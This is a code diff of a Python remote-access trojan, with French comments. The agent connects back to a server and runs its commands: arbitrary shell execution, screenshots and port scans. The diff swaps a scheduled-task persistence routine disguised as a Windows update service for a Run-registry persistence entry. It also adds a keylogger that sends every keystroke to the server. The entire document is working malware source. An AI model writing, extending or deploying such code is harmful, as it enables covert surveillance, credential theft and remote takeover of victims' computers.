@@ -1,43 +1,26 @@
 import socket
 import subprocess
-import os
 import sys
-import threading
+import winreg as reg
 from PIL import ImageGrab
+from pynput import keyboard
 
 ip_add = "127.0.0.1"
 port = 3280
 
-# Persitance
-def persistence():
-    exe_path = sys.executable #recupère le chemin du script
-    task_name = "WindowsUpdateService"
+# Persistance
+def persistance():
+    script_path = sys.argv[0]
+    registry_key = r"Software\Microsoft\Windows\CurrentVersion\Run"
 
-    os.system(f'schtasks /create /tn "{task_name}" /tr "{exe_path}" /sc onlogon >nul 2>&1') #création d'une tâche planifié pour exécuter au démarrage
+    key = reg.OpenKey(reg.HKEY_CURRENT_USER, registry_key, 0, reg.KEY_WRITE)
+    reg.SetValueEx(key, "agent.py", 0, reg.REG_SZ, script_path)
+    reg.CloseKey(key)
 
 # Lance l'agent
 def start_agent(s):
     s.connect((ip_add, port))
     data_socket(s)
-
-# Recoie et envoie des données
-def data_socket(s):
-    while True:
-        request = s.recv(1024)
-        command = request.decode("utf-8")
-
-        if command == "capture":
-            screenshot(s)
-        elif command.startswith("scan"):
-            try:
-                _, ip, port_range = command.split()
-                result = scan_port(ip, port_range)
-                s.send(result.encode("utf-8"))
-            except ValueError:
-                # Si la commande est mal formée, envoyer un message d'erreur au serveur
-                s.send(b"Invalid scan command. Use: scan <ip> <start_port>-<end_port>\n")
-        else: 
-            execute_command(s, command)
 
 # Execute la commande
 def execute_command(s, command):
@@ -74,12 +57,51 @@ def scan_port(ip, port_range):
                 results.append(f"Port {port} is closed")
     return "\n".join(results) 
 
+# Envoie les frappes au serveur 
+def send_keypress(s, key):
+    if hasattr(key, 'char') and key.char:
+        s.send(key.char.encode())
+    else:
+        s.send(str(key).encode())
+
+# touche presse
+def press(s, key):
+    send_keypress(s, key)
+
+# Recoie et envoie des données
+def data_socket(s):
+    while True:
+        request = s.recv(1024)
+        command = request.decode("utf-8")
+
+        if command == "capture":
+            screenshot(s)
+
+        elif command.startswith("scan"):
+            try:
+                _, ip, port_range = command.split()
+                result = scan_port(ip, port_range)
+                s.send(result.encode("utf-8"))
+            except ValueError:
+                # Si la commande est mal formée, envoyer un message d'erreur au serveur
+                s.send(b"Invalid scan command. Use: scan <ip> <start_port>-<end_port>\n")
+
+        elif command == "keylogger":
+            start_keylogger(s)
+        else: 
+            execute_command(s, command)
+
+# Demarre le keylogger et envoie les key
+def start_keylogger(s):
+    with keyboard.Listener(on_press=lambda key: press(s, key)) as listener:
+        listener.join()
 
 if __name__ == "__main__":
-
-    persistence_thread = threading.Thread(target=persistence)
-    persistence_thread.daemon = True  # Permet au thread de se fermer quand le programme principal termine
-    persistence_thread.start()
+    
+    persistance()
 
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     start_agent(s)
+
+
+        
